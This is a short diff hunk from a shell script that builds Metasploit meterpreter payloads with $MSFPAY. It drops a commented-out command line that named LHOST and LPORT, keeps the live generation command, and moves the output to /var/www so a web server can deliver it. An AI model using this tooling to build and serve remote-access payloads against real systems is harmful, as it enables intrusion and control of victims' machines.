@@ -127,7 +127,7 @@ esac
 
 
   info "Wait till we are Generating the [${BOLD}${YELLOW}$filename.$extension${RESET}]"
-  #echo "$MSFPAY $type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port $format > $dir/$filename.$extension"
+  
   $MSFPAY $type_payload/meterpreter/$stage LPORT=$port $format > $dir/$filename.$extension
 
   info "Transfer the [${BOLD}${YELLOW}$filename.$extension${RESET}] to /var/www for delivery and starting webserver"
